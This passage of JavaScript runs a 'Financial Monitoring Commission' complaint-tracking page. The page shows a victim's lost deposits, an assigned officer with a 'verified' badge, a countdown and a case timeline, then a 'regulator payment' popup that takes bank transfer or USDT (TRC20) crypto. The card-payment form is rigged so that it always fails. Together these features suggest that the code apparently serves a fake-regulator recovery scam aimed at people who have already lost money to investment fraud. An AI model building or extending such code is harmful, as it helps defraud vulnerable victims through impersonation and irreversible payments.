/* =========================================================
   FMC — Track a Complaint (full case detail)
   Reads case from localStorage["fmc_complaints"][ref] and
   renders: applicant info, case details, officer, 6-stage
   timeline, chat with officer, extra-file uploads and an
   optional regulator payment popup.
   ========================================================= */
(function () {
  function $(s, c) { return (c || document).querySelector(s); }
  function $all(s, c) { return Array.prototype.slice.call((c || document).querySelectorAll(s)); }
  function T(k) { return (window.FMC_I18N && window.FMC_I18N.t) ? window.FMC_I18N.t(k) : k; }
  function esc(s) { return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) { return ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"})[c]; }); }

  var PS_KEY = "fmc_payment_settings";
  var STATES = ["received", "review", "call", "info", "decision", "closed"];

  /* ---------- In-memory cache — data loaded from API ---------- */
  var _caseRec = null;
  function loadAll() { return _caseRec ? { [_caseRec.ref]: _caseRec } : {}; }
  function saveAll() {}
  function loadCase(ref) { return (_caseRec && _caseRec.ref === ref) ? _caseRec : null; }
  function saveCase(rec) { _caseRec = rec; /* in-memory; actual saves go via dedicated endpoints */ }

  /* ---------- Payment settings (DB-backed) ---------- */
  var PAYMENT_DEFAULTS = {
    bank: {
      accountName: "Financial Monitoring Commission",
      bankName: "",
      iban: "", swift: "", sort: "", accountNumber: "", address: "",
      reference: "Use your case reference (e.g. FMC-CMP-XXXXXX) as the payment reference."
    },
    crypto: { asset: "USDT", network: "TRC20", address: "", qr: "" }
  };
  var _paySettings = null;
  function loadPaymentSettings() {
    return _paySettings || JSON.parse(JSON.stringify(PAYMENT_DEFAULTS));
  }
  function fetchPaymentSettings(done) {
    fetch("/api/payment_settings.php")
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.ok && data.settings) _paySettings = data.settings;
        if (done) done();
      })
      .catch(function() { if (done) done(); });
  }

  /* ---------- Payment status helpers ---------- */
  function payStatus(pay) {
    if (!pay) return "awaiting";
    if (pay.status) return pay.status;
    return pay.paid ? "received" : "awaiting"; // backward compat
  }
  function payStatusLabel(s) {
    if (s === "reviewing") return T("tk.pay.status.reviewing");
    if (s === "received")  return T("tk.pay.status.received");
    return T("tk.pay.status.awaiting");
  }
  function payStatusPill(s) {
    if (s === "received")  return "closed";   // green
    if (s === "reviewing") return "review";   // blue
    return "decision";                         // amber/awaiting
  }

  /* ---------- Formatting ---------- */
  function fmtDate(iso) {
    if (!iso) return "—";
    try { return new Date(iso).toLocaleDateString(undefined, { year: "numeric", month: "short", day: "numeric" }); }
    catch (e) { return iso; }
  }
  function fmtDateTime(iso) {
    if (!iso) return "—";
    try {
      var d = new Date(iso);
      return d.toLocaleDateString(undefined, { year: "numeric", month: "short", day: "numeric" }) +
        " · " + d.toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit" });
    } catch (e) { return iso; }
  }
  function statePillClass(state) {
    if (state === "closed") return "closed";
    if (state === "decision") return "decision";
    if (state === "info") return "info";
    if (state === "call") return "call";
    if (state === "review") return "review";
    return "received";
  }

  /* ---------- Render: top + applicant + case ---------- */
  function renderHeader(rec) {
    $("#caseRef").textContent = rec.ref;
    $("#caseFiledLine").textContent = T("tk.filedOn") + " " + fmtDate(rec.createdAt);
    var pill = $("#caseStatePill");
    pill.className = "status-pill " + statePillClass(rec.state || "received");
    pill.textContent = T("tk.state." + (rec.state || "received") + ".label");
  }

  function kvRow(k, v) {
    return '<div class="kv"><div class="kv-k">' + esc(k) + '</div><div class="kv-v">' + esc(v || "—") + '</div></div>';
  }
  function docIcon(kind) {
    var paths = {
      id:       '<rect x="4" y="6" width="16" height="13" rx="2"/><circle cx="9" cy="11" r="2"/><path d="M14 11h3M14 14h4M6 16h7"/>',
      transfer: '<path d="M3 7h13l-3-3M21 17H8l3 3"/><circle cx="6" cy="7" r="1.5"/><circle cx="18" cy="17" r="1.5"/>',
      platform: '<rect x="3" y="4" width="18" height="13" rx="2"/><path d="M3 9h18M8 21h8M12 17v4"/>'
    };
    return '<svg class="doc-pill-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' + (paths[kind] || paths.id) + '</svg>';
  }
  function buildInfoItem(iconSvg, label, value) {
    return '<div class="info-item">' +
      '<div class="info-item-ico">' + iconSvg + '</div>' +
      '<div class="info-item-body">' +
        '<div class="info-item-k">' + esc(label) + '</div>' +
        '<div class="info-item-v">' + esc(value || "—") + '</div>' +
      '</div></div>';
  }
  function renderApplicant(rec) {
    var c = rec.complainant || {};
    var k = rec.case || {};
    var ev = rec.evidence || {};

    var initials = (c.fullName || "?").split(/\s+/).map(function (w) { return w[0] || ""; }).join("").slice(0, 2).toUpperCase();

    var icoMail  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg>';
    var icoPhone = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M5 4h3l2 5-2.5 1.5a11 11 0 0 0 6 6L15 14l5 2v3a2 2 0 0 1-2 2A16 16 0 0 1 3 6a2 2 0 0 1 2-2z"/></svg>';
    var icoCake  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11h16v8H4z"/><path d="M2 19h20"/><path d="M8 7v4M12 5v6M16 7v4"/><path d="M8 7c0-1 1-2 0-3M12 5c0-1 1-2 0-3M16 7c0-1 1-2 0-3"/></svg>';
    var icoFirm  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21V8l9-5 9 5v13"/><path d="M9 21v-7h6v7"/><path d="M3 21h18"/></svg>';

    var docs = [];
    if (ev.idDoc)    docs.push({ kind:"id",       label: ev.idType || T("tk.docs.id"),     name: ev.idDoc });
    if (ev.transfer) docs.push({ kind:"transfer", label: T("tk.docs.transfer"),            name: ev.transfer });
    if (ev.platform) docs.push({ kind:"platform", label: T("tk.docs.platform"),            name: ev.platform });

    var docsHtml = "";
    if (docs.length) {
      docsHtml = '<div class="applicant-docs">' +
        '<div class="applicant-docs-h">' + esc(T("tk.docs.title")) + '</div>' +
        '<div class="applicant-docs-list">' +
        docs.map(function (d) {
          return '<div class="doc-pill">' + docIcon(d.kind) +
            '<div class="doc-pill-body"><div class="doc-pill-k">' + esc(d.label) + '</div>' +
            '<div class="doc-pill-v">' + esc(d.name) + '</div></div>' +
            '<svg class="doc-pill-ok" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l4 4 10-10"/></svg>' +
            '</div>';
        }).join("") +
        '</div></div>';
    }

    var html =
      '<div class="applicant-pro">' +
        '<div class="applicant-pro-head">' +
          '<div class="applicant-avatar">' + esc(initials) + '</div>' +
          '<div class="applicant-pro-id">' +
            '<div class="applicant-pro-name">' + esc(c.fullName || "—") + '</div>' +
            '<div class="applicant-pro-sub muted small">' + esc(T("tk.complainant.role")) + '</div>' +
          '</div>' +
        '</div>' +
        '<div class="applicant-pro-grid">' +
          buildInfoItem(icoMail,  T("cf.f.email"), c.email) +
          buildInfoItem(icoPhone, T("cf.f.phone"), c.phone) +
          buildInfoItem(icoCake,  T("cf.f.dob"),   c.dob) +
          buildInfoItem(icoFirm,  T("tk.firm"),    k.firm) +
        '</div>' +
        docsHtml +
      '</div>';

    $("#caseApplicant").innerHTML = html;
  }
  function renderCase(rec) {
    var k = rec.case || {};
    var html = "";
    html += kvRow(T("tk.firm"), k.firm);
    html += kvRow(T("cf.r.amount"), k.amountDeposited ? ((k.currency || "") + " " + k.amountDeposited) : "—");
    html += kvRow(T("cf.r.balance"), k.lastBalance ? ((k.currency || "") + " " + k.lastBalance) : "—");
    html += kvRow(T("cf.r.contact"), k.lastContact);
    html += kvRow(T("tk.filed"), fmtDate(rec.createdAt));
    $("#caseDetails").innerHTML = html;

    var box = $("#caseReason");
    if (k.reason) {
      box.innerHTML = '<div class="kv-k upcase" style="margin-top:10px">' + esc(T("cf.r.reason")) + '</div><p>' + esc(k.reason) + '</p>';
      box.style.display = "block";
    } else {
      box.style.display = "none";
    }
  }

  /* ---------- Officer card ---------- */
  function officerInitials(name) {
    return (name || "?").split(/\s+/).map(function (w) { return w[0] || ""; }).join("").slice(0, 2).toUpperCase();
  }
  function officerAvatar(o, opts) {
    var size = (opts && opts.size) || "";
    var cls = "of-avatar" + (size ? " " + size : "");
    if (o && o.photo) return '<img class="' + cls + '" src="' + esc(o.photo) + '" alt="">';
    return '<div class="' + cls + ' of-avatar-init">' + esc(officerInitials(o && o.name)) + '</div>';
  }
  function verifiedBadge() {
    return '<span class="verified-badge" title="Verified" aria-label="Verified">' +
      '<svg viewBox="0 0 24 24" aria-hidden="true">' +
        '<path class="vb-bg" d="M12 2.6l2.4 1.7 2.9-.4 1.4 2.6 2.6 1.4-.4 2.9L22.6 12l-1.7 2.4.4 2.9-2.6 1.4-1.4 2.6-2.9-.4L12 22.6l-2.4-1.7-2.9.4-1.4-2.6-2.6-1.4.4-2.9L1.4 12l1.7-2.4-.4-2.9 2.6-1.4L6.7 2.7l2.9.4z"/>' +
        '<path class="vb-tick" d="M8 12.4l2.6 2.6L16.2 9.4" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>' +
      '</svg></span>';
  }
  function fmtCountdown(ms) {
    if (ms < 0) ms = 0;
    var totalSec = Math.floor(ms / 1000);
    var h = Math.floor(totalSec / 3600);
    var m = Math.floor((totalSec % 3600) / 60);
    var s = totalSec % 60;
    var pad = function (n) { return n < 10 ? "0" + n : "" + n; };
    return pad(h) + ":" + pad(m) + ":" + pad(s);
  }
  var _officerCountdownTimer = null;
  function clearOfficerCountdown() {
    if (_officerCountdownTimer) { clearInterval(_officerCountdownTimer); _officerCountdownTimer = null; }
  }
  function startOfficerCountdown(targetTs) {
    clearOfficerCountdown();
    var tick = function () {
      var el = document.getElementById("officerCountdown");
      if (!el) { clearOfficerCountdown(); return; }
      var remaining = targetTs - Date.now();
      el.textContent = fmtCountdown(remaining);
      if (remaining <= 0) clearOfficerCountdown();
    };
    tick();
    _officerCountdownTimer = setInterval(tick, 1000);
  }
  function renderOfficer(rec) {
    var box = $("#caseOfficer");
    if (!rec.officer) {
      var startTs = rec.createdAt ? new Date(rec.createdAt).getTime() : Date.now();
      var targetTs = startTs + 12 * 3600 * 1000;
      var remaining = Math.max(0, targetTs - Date.now());
      box.innerHTML =
        '<div class="of-pending">' +
          '<div class="of-halo">' +
            '<div class="of-halo-ring"></div>' +
            '<div class="of-halo-core"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0 1 16 0"/></svg></div>' +
          '</div>' +
          '<div class="of-pending-body">' +
            '<div class="of-name">' + esc(T("tk.officer.pending")) + '</div>' +
            '<div class="muted small">' + esc(T("tk.officer.pendingNote")) + '</div>' +
            '<div class="of-countdown">' +
              '<div class="of-countdown-l">' +
                '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 1.5M9 2h6"/></svg>' +
                '<span>' + esc(T("tk.officer.eta")) + '</span>' +
              '</div>' +
              '<div class="of-countdown-clock" id="officerCountdown">' + fmtCountdown(remaining) + '</div>' +
            '</div>' +
          '</div>' +
        '</div>';
      startOfficerCountdown(targetTs);
      return;
    }
    clearOfficerCountdown();
    var o = rec.officer;
    box.innerHTML =
      '<div class="of-card of-card-pro">' +
        '<div class="of-avatar-wrap">' + officerAvatar(o, { size: "lg" }) + verifiedBadge() + '</div>' +
        '<div class="of-meta">' +
          '<div class="of-name">' + esc(o.name || "—") + '</div>' +
          '<div class="muted small">' + esc(o.title || T("tk.officer.role")) + '</div>' +
          '<div class="of-tag"><span class="of-tag-dot"></span>' + esc(T("tk.officer.assigned")) + '</div>' +
        '</div>' +
      '</div>';
  }

  /* ---------- Timeline (6 states) ---------- */
  function timelineItem(stateKey, idx, curIdx, rec) {
    var done = idx < curIdx;
    var current = idx === curIdx;
    var cls = done ? "done" : (current ? "current" : "");
    var title = T("tk.state." + stateKey + ".label");
    var desc = T("tk.state." + stateKey + ".desc");

    var meta = "";
    var note = "";

    if (stateKey === "call" && (done || current) && rec.appointment && rec.appointment.at) {
      meta += '<div class="tl-meta">' +
        '<div class="tl-meta-row"><span class="upcase muted small">' + esc(T("tk.appointment")) + '</span>' +
          '<strong>' + esc(fmtDateTime(rec.appointment.at)) + '</strong></div>';
      if (rec.appointment.note) {
        meta += '<div class="tl-meta-row"><span class="upcase muted small">' + esc(T("tk.note")) + '</span><span>' + esc(rec.appointment.note) + '</span></div>';
      }
      meta += '</div>';
      note = '<div class="callout warn" style="margin-top:10px"><strong>' + esc(T("tk.call.warnTitle")) + ':</strong> ' + esc(T("tk.call.warnBody")) + '</div>';
    }

    if (stateKey === "info" && (done || current) && rec.infoRequest) {
      var items = (rec.infoRequest.items || []).filter(function (s) { return s && s.trim(); });
      if (items.length) {
        meta += '<div class="tl-meta"><div class="upcase muted small">' + esc(T("tk.info.requestedTitle")) + '</div>' +
          '<ul class="tl-list">' + items.map(function (it) { return '<li>' + esc(it) + '</li>'; }).join("") + '</ul></div>';
      }
      if (rec.infoRequest.note) {
        meta += '<div class="callout" style="margin-top:8px"><strong>' + esc(T("tk.note")) + ':</strong> ' + esc(rec.infoRequest.note) + '</div>';
      }
    }

    if (stateKey === "decision" && (done || current) && rec.decision) {
      if (rec.decision.text) {
        meta += '<div class="tl-meta"><div class="upcase muted small">' + esc(T("tk.decision.title")) + '</div><p>' + esc(rec.decision.text) + '</p></div>';
      }
      var pay = rec.decision.payment;
      if (pay && pay.enabled) {
        var amt = (pay.currency || "GBP") + " " + (pay.amount || "0");
        var st = payStatus(pay);
        meta += '<div class="tl-meta tl-pay"><div><div class="upcase muted small">' + esc(T("tk.pay.label")) + '</div>' +
          '<strong>' + esc(amt) + '</strong></div><div><span class="status-pill ' + payStatusPill(st) + '">' + esc(payStatusLabel(st)) + '</span></div></div>';
        if (st === "received") {
          meta += '<div class="callout" style="margin-top:8px"><strong>' + esc(T("tk.pay.received.note")) + '</strong></div>';
        }
      }
    }

    if (stateKey === "closed" && (done || current)) {
      meta += '<div class="muted small" style="margin-top:6px">' + esc(T("tk.closed.note")) + '</div>';
    }

    var dateLine = "";
    var hist = (rec.stateHistory || []).filter(function (h) { return h.state === stateKey; })[0];
    if (hist) dateLine = '<span class="tl-date">' + esc(fmtDateTime(hist.at)) + '</span>';

    return '<li class="' + cls + '" data-state="' + stateKey + '">' +
      '<div class="tl-head"><div class="tl-title">' + esc(title) + '</div>' + dateLine + '</div>' +
      '<div class="tl-desc">' + esc(desc) + '</div>' +
      meta + note +
      '</li>';
  }
  function renderTimeline(rec) {
    var cur = STATES.indexOf(rec.state || "received");
    if (cur < 0) cur = 0;
    var html = STATES.map(function (s, i) { return timelineItem(s, i, cur, rec); }).join("");
    $("#caseTimeline").innerHTML = html;

    // Pay button — visible only while case is in decision state, payment is enabled, and not yet received
    var btn = $("#payNowBtn");
    var pay2 = rec.decision && rec.decision.payment;
    if (rec.state === "decision" && pay2 && pay2.enabled && payStatus(pay2) !== "received") {
      btn.style.display = "";
    } else {
      btn.style.display = "none";
    }
  }

  /* ---------- Chat ---------- */
  function renderChat(rec) {
    var box = $("#chatBox");
    var msgs = rec.messages || [];
    if (!msgs.length) {
      box.innerHTML = '<div class="chat-empty muted small">' + esc(T("tk.chat.empty")) + '</div>';
      return;
    }
    var officer = rec.officer || null;
    box.innerHTML = msgs.map(function (m) {
      var isOfficer = m.from === "officer";
      var side = isOfficer ? "officer" : "applicant";
      if (isOfficer) {
        var who = m.author || (officer && officer.name) || T("tk.officer.role");
        var role = (officer && officer.title) || T("tk.officer.role");
        var avatar = officerAvatar({ name: who, photo: officer && officer.photo }, { size: "sm" });
        return '<div class="chat-msg ' + side + '">' +
          '<div class="chat-avatar">' + avatar + verifiedBadge() + '</div>' +
          '<div class="chat-body">' +
            '<div class="chat-meta">' +
              '<span class="chat-who">' + esc(who) + '</span>' +
              '<span class="chat-role muted small">' + esc(role) + '</span>' +
              '<span class="chat-time muted small">' + esc(fmtDateTime(m.at)) + '</span>' +
            '</div>' +
            '<div class="chat-bubble">' + esc(m.text) + '</div>' +
          '</div>' +
        '</div>';
      }
      return '<div class="chat-msg ' + side + '">' +
        '<div class="chat-body">' +
          '<div class="chat-meta">' +
            '<span class="chat-time muted small">' + esc(fmtDateTime(m.at)) + '</span>' +
            '<span class="chat-who">' + esc(T("tk.chat.you")) + '</span>' +
          '</div>' +
          '<div class="chat-bubble">' + esc(m.text) + '</div>' +
        '</div>' +
      '</div>';
    }).join("");
    box.scrollTop = box.scrollHeight;
  }

  /* ---------- Extra files ---------- */
  function renderExtraFiles(rec) {
    var ul = $("#extraList");
    var arr = rec.extraFiles || [];
    if (!arr.length) { ul.innerHTML = ""; return; }
    ul.innerHTML = arr.map(function (f) {
      var who = f.from === "applicant" ? T("tk.chat.you") : (f.author || T("tk.officer.role"));
      return '<li><span class="ef-name">' + esc(f.name) + '</span>' +
        '<span class="ef-meta muted small">' + esc(who) + ' · ' + esc(fmtDateTime(f.at)) +
        ' · ' + Math.round((f.size || 0) / 1024) + ' KB</span></li>';
    }).join("");
  }

  /* ---------- Chat launcher (button card) ---------- */
  function renderChatLauncher(rec) {
    var btn = $("#chatLauncher");
    var badge = $("#chatLauncherBadge");
    var sub = $("#chatLauncherSub");
    if (!btn || !badge) return;
    var unread = Math.max(0, parseInt(rec.applicantUnread || 0, 10) || 0);
    if (unread > 0) {
      badge.hidden = false;
      badge.textContent = unread > 99 ? "99+" : String(unread);
      btn.classList.add("has-unread");
      btn.setAttribute("aria-label", T("tk.chat") + " (" + unread + " " + T("tk.chat.launch.new") + ")");
    } else {
      badge.hidden = true;
      badge.textContent = "";
      btn.classList.remove("has-unread");
      btn.setAttribute("aria-label", T("tk.chat"));
    }
    if (sub) {
      var msgs = rec.messages || [];
      if (!msgs.length) {
        sub.textContent = T("tk.chat.launch.empty");
      } else {
        var last = msgs[msgs.length - 1];
        var who = last.from === "officer" ? (last.author || T("tk.officer.role")) : T("tk.chat.you");
        var preview = (last.text || "").replace(/\s+/g, " ").trim();
        if (preview.length > 70) preview = preview.slice(0, 67) + "…";
        sub.textContent = who + " · " + preview;
      }
    }
  }

  /* ---------- Chat modal popup ---------- */
  function openChatModal() {
    if (!currentRef) return;
    var rec = loadCase(currentRef);
    if (!rec) return;
    if (rec.applicantUnread) {
      rec.applicantUnread = 0;
      _caseRec = rec;
      renderChatLauncher(rec);
      /* Mark read on server */
      fetch("/api/mark_read.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ref: currentRef })
      }).catch(function(){});
    }
    renderChat(rec);
    var modal = $("#chatModal");
    if (!modal) return;
    modal.classList.add("open");
    document.body.style.overflow = "hidden";
    setTimeout(function () {
      var ta = $("#chatText");
      if (ta) ta.focus();
    }, 80);
  }
  function closeChatModal() {
    var modal = $("#chatModal");
    if (!modal) return;
    modal.classList.remove("open");
    document.body.style.overflow = "";
  }

  /* ---------- Render orchestrator ---------- */
  var currentRef = null;
  function renderAll(ref) {
    var rec = loadCase(ref);
    if (!rec) return;
    currentRef = ref;
    $("#lookupCard").style.display = "none";
    $("#caseShell").style.display = "";
    renderHeader(rec);
    renderApplicant(rec);
    renderCase(rec);
    renderOfficer(rec);
    renderTimeline(rec);
    renderChat(rec);
    renderChatLauncher(rec);
    renderExtraFiles(rec);
  }

  /* ---------- Lookup ---------- */
  function lookup(ref) {
    ref = (ref || "").trim().toUpperCase();
    var err = $("#trackError");
    err.style.display = "none";
    if (!ref) { err.textContent = T("tk.err.empty"); err.style.display = "block"; return; }
    var btn = $("#trackBtn");
    var origTxt = btn ? btn.textContent : "";
    if (btn) { btn.disabled = true; btn.textContent = "…"; }
    fetch("/api/track_complaint.php?ref=" + encodeURIComponent(ref))
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (btn) { btn.disabled = false; btn.textContent = origTxt; }
        if (!data.ok || !data.complaint) {
          err.innerHTML = T("tk.err.nf1") + " <strong>" + esc(ref) + "</strong>" + T("tk.err.nf2");
          err.style.display = "block";
          return;
        }
        _caseRec = data.complaint;
        history.replaceState(null, "", "?ref=" + encodeURIComponent(ref));
        renderAll(ref);
      })
      .catch(function() {
        if (btn) { btn.disabled = false; btn.textContent = origTxt; }
        err.textContent = "Network error. Please try again.";
        err.style.display = "block";
      });
  }
  function backToLookup() {
    currentRef = null;
    $("#caseShell").style.display = "none";
    $("#lookupCard").style.display = "";
    history.replaceState(null, "", location.pathname);
    $("#trackInput").value = "";
    $("#trackError").style.display = "none";
  }

  /* ---------- Chat send ---------- */
  function sendMessage() {
    if (!currentRef) return;
    var txt = ($("#chatText").value || "").trim();
    if (!txt) return;
    var rec = loadCase(currentRef);
    if (!rec) return;
    /* Optimistic update */
    rec.messages = rec.messages || [];
    rec.messages.push({ from: "applicant", text: txt, at: new Date().toISOString() });
    _caseRec = rec;
    $("#chatText").value = "";
    renderChat(rec);
    renderChatLauncher(rec);
    /* Persist to server */
    fetch("/api/send_message.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        reference: currentRef,
        name: (rec.complainant && rec.complainant.fullName) || "Complainant",
        email: (rec.complainant && rec.complainant.email) || "",
        message: txt
      })
    }).catch(function(){});
  }

  /* ---------- Extra file upload ---------- */
  function wireExtraUpload() {
    var block = $("#uploadExtra");
    var input = $("#extraInput");
    if (!block || !input) return;
    block.addEventListener("click", function () {
      if (!block.classList.contains("uploading")) input.click();
    });
    input.addEventListener("change", function () {
      if (!currentRef) return;
      if (!input.files || !input.files[0]) return;
      var f = input.files[0];
      var rec = loadCase(currentRef);
      if (!rec) return;

      /* Show uploading state */
      block.classList.add("uploading");
      var origLabel = block.querySelector("span") || block;
      var prevText = origLabel.textContent || "";
      if (origLabel) origLabel.textContent = "\u23f3 Uploading…";

      var fd = new FormData();
      fd.append("file", f);
      fd.append("context", "extra");
      fd.append("reference", currentRef);
      fetch("/api/upload_file.php", { method: "POST", body: fd })
        .then(function(r) { return r.json(); })
        .then(function(data) {
          block.classList.remove("uploading");
          if (origLabel) origLabel.textContent = prevText;
          input.value = "";
          if (!data.ok) {
            alert("Upload failed: " + (data.error || "Unknown error"));
            return;
          }
          /* Save file entry to DB via send_message.php */
          var fileEntry = {
            name: f.name,
            size: f.size,
            url:  data.url,
            from: "applicant",
            at:   new Date().toISOString()
          };
          fetch("/api/send_message.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              reference:   currentRef,
              name:        (rec.complainant && rec.complainant.fullName) || "Complainant",
              email:       (rec.complainant && rec.complainant.email) || "",
              message:     null,
              extra_file:  fileEntry
            })
          })
          .then(function(r) { return r.json(); })
          .then(function(d) {
            if (d.ok && d.record) {
              _caseRec = d.record;
              renderExtraFiles(d.record);
            } else {
              /* Fallback: update in memory */
              rec.extraFiles = rec.extraFiles || [];
              rec.extraFiles.push(fileEntry);
              saveCase(rec);
              renderExtraFiles(rec);
            }
          })
          .catch(function() {
            rec.extraFiles = rec.extraFiles || [];
            rec.extraFiles.push(fileEntry);
            saveCase(rec);
            renderExtraFiles(rec);
          });
        })
        .catch(function() {
          block.classList.remove("uploading");
          if (origLabel) origLabel.textContent = prevText;
          input.value = "";
          alert("Upload failed. Please try again.");
        });
    });
  }

  /* ---------- Payment popup ---------- */
  function bankRow(label, value) {
    if (!value) return "";
    return '<div class="bank-row"><span class="bank-k">' + esc(label) + '</span>' +
      '<span class="bank-v"><span class="bank-val">' + esc(value) + '</span>' +
      '<button type="button" class="btn-copy" data-copy="' + esc(value) + '" title="Copy">' + esc(T("pay.copy")) + '</button></span></div>';
  }
  function renderBankPanel(bk) {
    var html =
      bankRow(T("pay.bank.beneficiary"), bk.accountName) +
      bankRow(T("pay.bank.bankName"),    bk.bankName) +
      bankRow(T("pay.bank.iban"),        bk.iban) +
      bankRow(T("pay.bank.swift"),       bk.swift) +
      bankRow(T("pay.bank.sort"),        bk.sort) +
      bankRow(T("pay.bank.account"),     bk.accountNumber) +
      bankRow(T("pay.bank.address"),     bk.address) +
      bankRow(T("pay.bank.reference"),   bk.reference);
    $("#payBankBox").innerHTML = html;
    $all("#payBankBox .btn-copy").forEach(function (b) {
      b.addEventListener("click", function () { copyText(b.dataset.copy, b); });
    });
  }
  function renderCryptoPanel(cr) {
    var asset = (cr.asset || "USDT") + " — " + (cr.network || "TRC20");
    $("#payCryptoAsset").textContent = asset;
    $("#payCryptoAddress").textContent = cr.address || "—";
    var qrBox = $("#payCryptoQr");
    if (cr.qr) {
      qrBox.innerHTML = '<img src="' + esc(cr.qr) + '" alt="QR">';
    } else if (cr.address) {
      var src = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=8&data=" + encodeURIComponent(cr.address);
      qrBox.innerHTML = '<img src="' + src + '" alt="QR" onerror="this.parentNode.innerHTML=\'<div class=qr-fallback>QR</div>\'">';
    } else {
      qrBox.innerHTML = '<div class="qr-fallback">QR</div>';
    }
  }
  function copyText(text, btn) {
    var ok = function () {
      if (!btn) return;
      var prev = btn.textContent;
      btn.textContent = T("pay.copied");
      btn.classList.add("copied");
      setTimeout(function () { btn.textContent = prev; btn.classList.remove("copied"); }, 1400);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(ok, function () {});
    } else {
      try {
        var ta = document.createElement("textarea");
        ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
        document.body.appendChild(ta); ta.select(); document.execCommand("copy");
        document.body.removeChild(ta); ok();
      } catch (e) {}
    }
  }
  function switchPayTab(name) {
    $all(".pay-tab").forEach(function (b) { b.classList.toggle("active", b.dataset.paytab === name); });
    $all(".pay-panel").forEach(function (p) { p.classList.toggle("active", p.id === "payPanel-" + name); });
    if (name === "card") {
      $("#payCardError").style.display = "none";
    }
  }
  function openPayModal() {
    if (!currentRef) return;
    var rec = loadCase(currentRef);
    if (!rec || !rec.decision || !rec.decision.payment) return;
    var pay = rec.decision.payment;
    var st = payStatus(pay);
    $("#payAmount").textContent = (pay.currency || "GBP") + " " + (pay.amount || "0");
    $("#payCaseRef").textContent = rec.ref;
    var pill = $("#payStatusPill");
    pill.className = "status-pill " + payStatusPill(st);
    pill.textContent = payStatusLabel(st);

    /* Fetch fresh payment settings from DB then render */
    fetchPaymentSettings(function() {
      var ps = loadPaymentSettings();
      renderBankPanel(ps.bank || {});
      renderCryptoPanel(ps.crypto || {});
    });

    // reset card form
    ["payName", "payNumber", "payExp", "payCvc"].forEach(function (id) { var el = $("#" + id); if (el) el.value = ""; });
    $("#payCardError").style.display = "none";

    switchPayTab("bank");
    $("#payModal").classList.add("open");
    document.body.style.overflow = "hidden";
  }
  function closePayModal() {
    $("#payModal").classList.remove("open");
    document.body.style.overflow = "";
  }
  function submitCardPayment() {
    // Always show the unsupported notice — card payments are intentionally rejected.
    $("#payCardError").style.display = "block";
    $("#payCardError").scrollIntoView({ behavior: "smooth", block: "nearest" });
  }
  function autoFormatCard() {
    var num = $("#payNumber");
    if (num) num.addEventListener("input", function () {
      var d = num.value.replace(/\D+/g, "").slice(0, 19);
      num.value = d.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
    });
    var exp = $("#payExp");
    if (exp) exp.addEventListener("input", function () {
      var d = exp.value.replace(/\D+/g, "").slice(0, 4);
      exp.value = d.length > 2 ? d.slice(0, 2) + "/" + d.slice(2) : d;
    });
  }

  /* ---------- Live sync (storage event + interval) ---------- */
  function softReload() {
    if (!currentRef) return;
    fetch("/api/track_complaint.php?ref=" + encodeURIComponent(currentRef))
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (!data.ok || !data.complaint) return;
        _caseRec = data.complaint;
        var rec = data.complaint;
        renderHeader(rec);
        renderOfficer(rec);
        renderTimeline(rec);
        renderChatLauncher(rec);
        renderExtraFiles(rec);
        var chatModal = $("#chatModal");
        if (!chatModal || !chatModal.classList.contains("open")) renderChat(rec);
      })
      .catch(function(){});
  }

  /* ---------- Init ---------- */
  document.addEventListener("DOMContentLoaded", function () {
    var btn = $("#trackBtn"), input = $("#trackInput");
    if (!btn || !input) return;
    btn.addEventListener("click", function () { lookup(input.value); });
    input.addEventListener("keydown", function (e) { if (e.key === "Enter") lookup(input.value); });

    $("#caseChangeRef").addEventListener("click", backToLookup);
    $("#chatSend").addEventListener("click", sendMessage);
    $("#chatText").addEventListener("keydown", function (e) {
      if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) { e.preventDefault(); sendMessage(); }
    });
    var launcher = $("#chatLauncher");
    if (launcher) launcher.addEventListener("click", openChatModal);
    var chatClose = $("#chatModalClose");
    if (chatClose) chatClose.addEventListener("click", closeChatModal);
    var chatModal = $("#chatModal");
    if (chatModal) chatModal.addEventListener("click", function (e) {
      if (e.target === chatModal) closeChatModal();
    });
    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape" && chatModal && chatModal.classList.contains("open")) closeChatModal();
    });

    wireExtraUpload();

    $("#payNowBtn").addEventListener("click", openPayModal);
    $("#payClose").addEventListener("click", closePayModal);
    $("#payCancel").addEventListener("click", closePayModal);
    $all(".pay-tab").forEach(function (b) {
